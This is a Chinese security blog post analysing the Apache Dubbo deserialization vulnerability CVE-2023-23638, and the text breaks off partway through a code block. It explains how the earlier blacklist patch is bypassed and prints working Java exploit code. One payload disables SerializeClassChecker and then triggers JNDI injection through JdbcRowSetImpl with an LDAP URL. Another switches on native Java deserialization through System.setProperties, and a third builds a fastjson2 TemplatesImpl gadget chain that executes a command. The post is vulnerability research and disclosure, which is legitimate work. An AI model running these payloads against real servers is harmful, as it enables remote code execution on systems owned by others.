<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta name="description" content="">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        Apache Dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索 - YYHYlh&#39;s blog
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>

    









<meta name="generator" content="Hexo 6.3.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> 常记常新 </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>YYHYlh</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-text">漏洞背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1"><span class="toc-text">利用方式1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2"><span class="toc-text">利用方式2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%8B%93%E5%B1%95"><span class="toc-text">进一步拓展</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 常记常新 </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        Apache Dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2023-04-08 18:51:00</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#漏洞复现" title="漏洞复现">漏洞复现</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content no-indent">
        <pre><code>本文首发于先知社区:https://xz.aliyun.com/t/12396
</code></pre>
<p> 在对Apache dubbo 的CVE-2023-23638漏洞分析的过程中，通过对师傅们对这个漏洞的学习和整理，再结合了一些新学的技巧运用，从而把这个漏洞的利用向前推了一步。整个过程中的研究思路以及遇到问题并解决问题的过程，我觉得值得分享，所以写下此文记录。</p>
<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p> Apache Dubbo 是一款易用、高性能的WEB 和RPC 框架，同时为构建企业级微服务提供服务发现、流量治理、可观测、认证鉴权等能力、工具与最佳实践。</p>
<p> 该漏洞核心原理是利用dubbo的泛化调用功能，反序列化任意类，从而造成反序列化攻击。这个漏洞影响Apache Dubbo 2.7.x，2.7.21及之前版本； Apache Dubbo 3.0.x 版本，3.0.13 及之前版本； Apache Dubbo 3.1.x 版本，3.1.5 及之前的版本。</p>
<p> 在普通的Dubbo方法调用过程中，客户端需要环境中存在被调用类的接口，才能正常继续调用。泛化调用则是指在客户端在没有服务方提供的 API（SDK）的情况下，对服务方进行调用，并且可以正常拿到调用结果。 详细的泛化调用说明可以见：<a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/" title="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a>。</p>
<p> 既然是泛化调用，那就代表用户可以在Dubbo服务端传入任意类。也正是因为这个功能，给Dubbo带来了一些漏洞，在CVE-2021-30179中，由于这个功能没有对传入的类做任何的限制，导致攻击者可以通过传入恶意的类，并调用其特定方法，导致代码执行。后续Dubbo在代码层面对传入的类进行了限制，从而防御攻击者传入恶意的类进行RCE，而这个防御，在CVE-2023-23638中被绕过，也就是本篇文章所要讲述的内容。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p> Dubbo处理泛化调用请求的核心类是org.apache.dubbo.rpc.filter.GenericFilter，在这个filter的invoke方法中，对客户端的调用进行了判断，同时根据服务端的配置进入不同的反序列化逻辑。用户进行泛化调用时可以传入一个hashmap，当map中存在generic-raw.return这组键值对时，GenericFilter就会进入PojoUtils.realize()方法，把用户传入的类进行实例化，并对实例化后对象的属性进行赋值。</p>
<p> CVE-2021-30179的补丁打在了类初始化的时候：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pojo <span class="keyword">instanceof</span> Map &amp;&amp; type != <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">className</span> <span class="operator">=</span> ((Map)pojo).get(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (className <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">      SerializeClassChecker.getInstance().validateClass((String)className);</span><br><span class="line">      <span class="keyword">if</span> (!CLASS_NOT_FOUND_CACHE.containsKey(className)) &#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              type = ClassUtils.forName((String)className);</span><br><span class="line">          &#125; <span class="keyword">catch</span> (ClassNotFoundException var22) &#123;</span><br><span class="line">              CLASS_NOT_FOUND_CACHE.put((String)className, NOT_FOUND_VALUE);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p> 通过调用<code>SerializeClassChecker.getInstance().validateClass((String)className);</code>对传入的类进行黑名单过滤，过滤结束后使用<code>ClassUtils.forName((String)className);</code>获取类，后续会调用class.newInstance()进行类的实例化，最后通过如下代码进行对象的属性赋值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> getSetterMethod(dest.getClass(), name, value.getClass());</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(dest.getClass(), name);</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!method.isAccessible()) &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Type</span> <span class="variable">ptype</span> <span class="operator">=</span> method.getGenericParameterTypes()[<span class="number">0</span>];</span><br><span class="line">        value = realize0(value, method.getParameterTypes()[<span class="number">0</span>], ptype, history);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method.invoke(dest, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var20) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">exceptionDescription</span> <span class="operator">=</span> <span class="string">&quot;Failed to set pojo &quot;</span> + dest.getClass().getSimpleName() + <span class="string">&quot; property &quot;</span> + name + <span class="string">&quot; value &quot;</span> + value.getClass() + <span class="string">&quot;, cause: &quot;</span> + var20.getMessage();</span><br><span class="line">            logger.error(<span class="string">&quot;0-8&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, exceptionDescription, var20);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(exceptionDescription, var20);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">        value = realize0(value, field.getType(), field.getGenericType(), history);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field.set(dest, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var19) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to set field &quot;</span> + name + <span class="string">&quot; of pojo &quot;</span> + dest.getClass().getName() + <span class="string">&quot; : &quot;</span> + var19.getMessage(), var19);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 程序会先尝试先获取类属性的set方法，如果目标类存在这个set方法，那么会利用method.invoke进行执行。如果没有set方法，那么会通过反射获取类的目标属性，然后调用field.set进行赋值。</p>
<p> 也就是说，泛化调用对于用户提供了如下的代码执行点：</p>
<p> 我们可以传入任意的非黑名单类，然后调用这个类的public或者private无参构造方法，然后可以调用这个生成的Object的任意set+METHOD_NAME方法，要求参数有且仅有一个，或者利用object.field.set方法对这个object的任意属性赋值。</p>
<p> 这个漏洞存在两种利用方式，对应了dubbo提供的两种赋值的方法。</p>
<h2 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h2><p> 利用object.field.set进行利用。</p>
<p> Dubbo在泛化调用中，对传入类进行黑名单过滤的具体代码在org.apache.dubbo.common.utils.PojoUtils#realize0，使用SerializeClassChecker的validateClass方法进行过滤。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">className</span> <span class="operator">=</span> ((Map)pojo).get(<span class="string">&quot;class&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (className <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    SerializeClassChecker.getInstance().validateClass((String)className);</span><br><span class="line">    <span class="keyword">if</span> (!CLASS_NOT_FOUND_CACHE.containsKey(className)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            type = ClassUtils.forName((String)className);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var22) &#123;</span><br><span class="line">            CLASS_NOT_FOUND_CACHE.put((String)className, NOT_FOUND_VALUE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> validateClass方法内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validateClass</span><span class="params">(String name, <span class="type">boolean</span> failOnError)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.OPEN_CHECK_CLASS) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 这个方法首先会对SerializeClassChecker的OPEN_CHECK_CLASS属性进行判断，如果这个属性为false，那么就不会对传入类进行检查，直接返回。再看getInstance方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SerializeClassChecker <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (INSTANCE == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var0</span> <span class="operator">=</span> SerializeClassChecker.class;</span><br><span class="line">        <span class="keyword">synchronized</span>(SerializeClassChecker.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (INSTANCE == <span class="literal">null</span>) &#123;</span><br><span class="line">                INSTANCE = <span class="keyword">new</span> <span class="title class_">SerializeClassChecker</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这是一个典型的单例模式的写法。因此如果我们可以替换掉这个INSTANCE对象，将它的OPEN_CHECK_CLASS属性置为false，那么就可以绕过黑名单类的检查，之后就可以使用类似CVE-2021-30179的POC进行代码执行。核心代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map <span class="title function_">getInstance</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">newChecker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    newChecker.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;org.apache.dubbo.common.utils.SerializeClassChecker&quot;</span>);</span><br><span class="line">    newChecker.put(<span class="string">&quot;OPEN_CHECK_CLASS&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;org.apache.dubbo.common.utils.SerializeClassChecker&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;INSTANCE&quot;</span>, newChecker);</span><br><span class="line">    <span class="type">LinkedHashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line">    map2.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line">    map2.put(<span class="string">&quot;DataSourceName&quot;</span>, <span class="string">&quot;ldap://127.0.0.1:1099/exp&quot;</span>);</span><br><span class="line">    map2.put(<span class="string">&quot;autoCommit&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map3.put(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;java.util.HashMap&quot;</span>);</span><br><span class="line">    map3.put(<span class="string">&quot;1&quot;</span>,map);</span><br><span class="line">    map3.put(<span class="string">&quot;2&quot;</span>,map2);</span><br><span class="line">    <span class="keyword">return</span> map3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 第一个newChecker，用于创建一个OPEN_CHECK_CLASS属性值为false的SerializeClassChecker的对象，第二个map，用于将newChecker传入到SerializeClassChecker的单例INSTACNE属性中。然后第三个map2，使用类似CVE-2021-30179的POC，创建一个com.sun.rowset.JdbcRowSetImpl对象，然后dubbo会先后调用setDataSourceName和setAutoCommit，从而向我们指定的地址发起JNDI请求。需要注意这里map2需要设置为LinkedHashMap，否则在dubbo进行set调用时可能无法按照先setDataSourceName，再setAutoCommit的顺序执行。</p>
<h2 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h2><p> 利用object.set+METHOD_NAME进行利用。</p>
<p> dubbo在泛化调用的过程中是存在一个接口允许原生java反序列化的。但是这个接口默认不开启，同时会进行序列化的黑名单类检查。然而这个接口调用开关是可以被控制的，我们如果可以把它打开，那么这个漏洞就变成了一个原生的java反序列化漏洞，利用特定的gadget就可以RCE。在<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12333#toc-5" title="https://xz.aliyun.com/t/12333#toc-5">https://xz.aliyun.com/t/12333#toc-5</a>中，师傅提到了可以使用<code>org.apache.dubbo.common.utils.ConfigUtils</code>类，它存在一个setProperties方法，可以对<code>PROPERTIES</code>对象进行赋值，从而控制开关。但是我发现<code>org.apache.dubbo.common.utils.ConfigUtils</code>的setProperties方法只在2.7.x版本的dubbo存在，3.0.x和3.1.x都是没有的。那有没有什么通用的方法呢？事实上，Dubbo的configuration也是可以通过java.lang.System类的props对象进行传入的。那么就可以直接调用System.setProperties方法，传入修改后的dubbo配置。代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;dubbo.security.serialize.generic.native-java-enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;serialization.security.check&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;properties&quot;</span>, properties);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 在这之后就可以使用类似如下的代码进行原生反序列化利用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">out.writeObject(getEvilObject());</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">attachments</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">attachments.put(<span class="string">&quot;generic&quot;</span>, <span class="string">&quot;nativejava&quot;</span>);</span><br><span class="line">out.writeObject(attachments);</span><br></pre></td></tr></table></figure>

<h1 id="进一步拓展"><a href="#进一步拓展" class="headerlink" title="进一步拓展"></a>进一步拓展</h1><p> 上述两种方法，在公开的分析文章里，都存在着一些问题。方法1中最终的Sink点是JNDI注入，需要出网。方法2中最终需要依赖特定的Gadget，在之前的Dubbo的反序列化分析文章中，大家在Gadget选择时都会使用一些三方依赖进行漏洞利用，例如Rome、CommonsBeanutils1等。那Dubbo是否存在原生的Java反序列化链呢？</p>
<p> 在Dubbo 3.1.x的版本中，新增了对Fastjson2的支持。恰好前段时间刚好看到有师傅发了<a target="_blank" rel="noopener" href="https://paper.seebug.org/2055/#fastjson1" title="fastjson库在原生Java反序列化中的利用">fastjson库在原生Java反序列化中的利用</a>。结论是fastjons小于1.2.48版本是可以使用，fastjson2全版本是通杀的。利用的原理是fastjson的JSONArray或者JSONObject在调用其toString方法时，会触发其包裹对象的get+METHOD_NAME方法。因此很容易想到可以包裹一个TemplatesImpl对象，通过调用其getOutputProperties方法，从而执行任意代码。</p>
<p> 既然已经有了方法，那实现一下试试吧。关键代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;dubbo.security.serialize.generic.native-java-enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;serialization.security.check&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;properties&quot;</span>, properties);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superClass);</span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,</span><br><span class="line">            clazz);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">    clazz.addConstructor(constructor);</span><br><span class="line">    <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">    setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">    setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">    jsonArray.add(templates);</span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">            <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    valfield.set(val, jsonArray);</span><br><span class="line"></span><br><span class="line">    <span class="type">NativeJavaSerialization</span> <span class="variable">nativeJavaSerialization</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">NativeJavaSerialization</span>();</span><br><span class="line">    <span class="type">UnsafeByteArrayOutputStream</span> <span class="variable">unsafeByteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnsafeByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">o</span> <span class="operator">=</span> nativeJavaSerialization.serialize(<span class="literal">null</span>,unsafeByteArrayOutputStream);</span><br><span class="line">    o.writeObject(val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unsafeByteArrayOutputStream.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">send(getProperties());</span><br><span class="line">send(getObject());</span><br></pre></td></tr></table></figure>

<p> 程序先通过System.setProperties修改目标的序列化配置，然后再发送恶意的序列化代码，指定目标执行一个Calc.exe程序。结果程序报错了，报错如下：</p>
<p><img src="/img/CVE-2023-23638_1/image_HO65mXc32i.png"></p>
<p><img src="/img/CVE-2023-23638_1/image_5VIaNuuwmv.png"></p>
<p> 程序最前面和预期的一样，成功执行了Java原生反序列化，但是在反序列化的过程中，fastjson2的JSONWriter$Context的类初始化时，在TzdbZoneRulesProvider的构造函数中报错了，其构造函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TzdbZoneRulesProvider</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">libDir</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.home&quot;</span>) + File.separator + <span class="string">&quot;lib&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(</span><br><span class="line">                 <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(</span><br><span class="line">                     <span class="keyword">new</span> <span class="title class_">File</span>(libDir, <span class="string">&quot;tzdb.dat&quot;</span>))))) &#123;</span><br><span class="line">            load(dis);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span 